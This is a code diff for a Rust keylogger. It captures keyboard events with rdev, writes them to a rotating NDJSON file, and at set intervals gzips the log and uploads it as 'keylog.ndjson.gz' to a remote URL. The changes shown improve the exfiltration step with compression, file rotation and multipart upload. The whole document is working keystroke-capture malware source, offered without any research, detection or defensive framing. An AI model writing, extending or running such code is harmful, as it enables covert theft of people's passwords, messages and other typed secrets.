@@ -1,4 +1,5 @@
-use std::{fs::File, io::{BufWriter, Write}, time::{SystemTime, UNIX_EPOCH}};
+use std::{fs::File, io::{BufWriter, Read, Write}, time::{SystemTime, UNIX_EPOCH}};
+use flate2::{write::GzEncoder, Compression};
 use rdev::{listen, Event, EventType};
 use serde::Serialize;
 use reqwest::Client;
@@ -61,17 +62,40 @@ fn create_callback(
     Box::new(cb)
 }
 
-pub async fn upload_keylog(
+fn gzip_file_to_vec(path: &str) -> anyhow::Result<Vec<u8>> {
+    let mut input = File::open(path)?;
+    let mut buf = Vec::new();
+
+    input.read_to_end(&mut buf)?;
+
+    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
+    encoder.write_all(&buf)?;
+    let compressed = encoder.finish()?;
+    Ok(compressed)
+}
+
+async fn upload_keylog(
     url: &str,
     path: &str,
 ) -> anyhow::Result<()> {
+    let temp_path = format!("{}.upload", path);
+    std::fs::copy(path, &temp_path)?;
+    
+    let compressed = gzip_file_to_vec(&temp_path)?;
+    
     let form = reqwest::multipart::Form::new()
-        .file("file", path).await?;
+        .part("file", reqwest::multipart::Part::bytes(compressed)
+            .file_name("keylog.ndjson.gz")
+            .mime_str("application/gzip")?);
+    
     let response = Client::new()
         .post(url)
         .multipart(form)
         .send()
         .await?;
+
+    let _ = std::fs::remove_file(&temp_path);
+
     if !response.status().is_success() {
         return Err(anyhow::anyhow!(
             "Failed to upload file: {}",
@@ -98,14 +122,14 @@ async fn main() -> anyhow::Result<()> {
         .map(|s| s.parse().unwrap_or(60))
         .unwrap_or(60);
 
+    let current_file = format!("{}.current", path);
     let file = File::options()
         .create(true)
         .append(true)
-        .open("keylog.ndjson")?;
+        .open(&current_file)?;
     let writer = BufWriter::new(file);
     let callback = create_callback(writer);
     let (stop_tx, mut stop_rx) = watch::channel(false);
-
 
     let send_thread = tokio::spawn(async move {
         let mut tick = tokio::time::interval(
@@ -115,8 +139,19 @@ async fn main() -> anyhow::Result<()> {
         loop {
             select! {
                 _ = tick.tick() => {
-                    if let Err(error) = upload_keylog(&url, &path).await {
-                        println!("Error: {:?}", error);
+                    if std::path::Path::new(&current_file).metadata().map(|m| m.len()).unwrap_or(0) > 0 {
+                        if let Err(e) = std::fs::rename(&current_file, &path) {
+                            println!("Failed to rotate file: {}", e);
+                        } else {
+                            let _ = File::options()
+                                .create(true)
+                                .write(true)
+                                .open(&current_file);
+                            
+                            if let Err(error) = upload_keylog(&url, &path).await {
+                                println!("Error: {:?}", error);
+                            }
+                        }
                     }
                 }
                 _ = stop_rx.changed() => {
